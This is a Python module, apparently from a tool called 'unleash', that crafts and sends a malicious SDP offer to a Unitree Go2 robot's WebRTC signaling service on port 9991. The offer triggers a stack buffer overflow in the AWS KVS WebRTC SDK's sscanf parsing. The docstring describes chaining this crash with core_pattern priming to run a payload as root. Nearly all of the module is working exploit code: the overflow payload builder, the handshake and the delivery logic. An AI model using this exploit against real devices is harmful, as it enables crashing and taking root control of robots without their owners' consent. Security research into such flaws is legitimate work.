"""
Crash trigger for Unitree Go2 WebRTC client.

Delivers a crafted SDP offer via HTTP signaling (port 9991) that triggers
a stack buffer overflow in unitreeWebRTCClientMaster's parseMediaAttributes().

The sscanf in AWS KVS WebRTC SDK (< v1.18.1) writes attribute names to a
~520-byte stack buffer without length checking:

    sscanf(line, "a=%[^:]:%[^\r\n]", attrName, attrValue)

An attribute name longer than the buffer overwrites the stack → SIGSEGV.
Combined with core_pattern priming (USB MSC dongle), this fires the
payload as root.

Usage: after the MSC dongle has primed core_pattern, run:
    unleash crash --aes-key <key>
"""

import logging

from .webrtc import handshake, send_offer

logger = logging.getLogger("unleash.core.crash")

DEFAULT_ROBOT_IP = "192.168.123.162"
DEFAULT_PORT = 9991


def build_crash_sdp():
    """Build a minimal SDP that crashes parseMediaAttributes().

    Structure: 5 media descriptions. MD4 (m=application) carries 252
    padding attributes followed by a 256th attribute whose 522-byte name
    overflows the stack buffer. The 5-MD / 252-pad structure matches the
    proven crash recipe from sdp_crash_poc.py (variant 3).
    """
    lines = []

    # Session-level
    lines.append("v=0")
    lines.append("o=- 1234567890 1 IN IP4 0.0.0.0")
    lines.append("s=-")
    lines.append("t=0 0")
    lines.append("a=group:BUNDLE 0 1 2 3 4")

    # MD0: fingerprint placeholder (xfkTon expects this shape)
    lines.append("m=fingerprint")
    lines.append("c=IN IP4 0.0.0.0")
    lines.append("a=mid:0")

    # MD1-MD3: video padding
    for i in range(1, 4):
        lines.append("m=video 9 UDP/TLS/RTP/SAVPF 96")
        lines.append(f"a=mid:{i}")

    # MD4: data channel + padding attrs + overflow attr
    lines.append("m=application 9 UDP/DTLS/SCTP webrtc-datachannel")
    lines.append("a=ice-ufrag:crash")
    lines.append("a=ice-pwd:crashcrashcrashcrashcrashcrash")
    lines.append("a=mid:4")

    n_real_attrs = 3  # ice-ufrag, ice-pwd, mid
    n_padding = 255 - n_real_attrs
    for i in range(n_padding):
        lines.append(f"a=pad{i:03d}:x")

    # The overflow: 522-byte attribute name (520 'A' + 2 bytes)
    # overflows the ~520-byte attrName stack buffer in sscanf
    overflow_name = "A" * 520 + "BB"
    lines.append(f"a={overflow_name}:crash")

    return "\r\n".join(lines) + "\r\n"


def crash_webrtc(robot_ip=DEFAULT_ROBOT_IP, port=DEFAULT_PORT,
                 aes_key=None):
    """Perform HTTP signaling handshake and deliver crash SDP.

    Returns True if the crash was delivered (connection error from xfkTon
    after SDP delivery = success, since the WebRTC client died).
    """
    print(f"  [1/3] Signaling handshake with {robot_ip}:{port}...")
    data1, pubkey = handshake(robot_ip, port=port, aes_128_key=aes_key)
    logger.debug("Handshake OK, got RSA pubkey (%d bits)", pubkey.size_in_bits())

    print("  [2/3] Building crash SDP...")
    sdp = build_crash_sdp()
    logger.debug("Crash SDP: %d bytes, %d lines",
                 len(sdp), sdp.count("\n"))

    print("  [3/3] Sending crash SDP...")
    try:
        resp = send_offer(robot_ip, data1, pubkey, sdp, port=port)
    except Exception as e:
        # Connection errors after SDP delivery = the WebRTC client crashed
        # and xfkTon dropped the connection. This is the expected outcome.
        if "Connection" in type(e).__name__ or "Timeout" in type(e).__name__:
            print(f"  Crash delivered (connection dropped: {type(e).__name__})")
            return True
        raise

    if resp is None:
        print("  Crash delivered (empty response — client likely crashed)")
        return True

    # If we got a real SDP answer back, the client survived (unexpected)
    logger.warning("Got SDP answer back — client may not have crashed")
    print("  Warning: received SDP answer — crash may not have triggered")
    print("  The WebRTC client may need a different overflow length.")
    return False
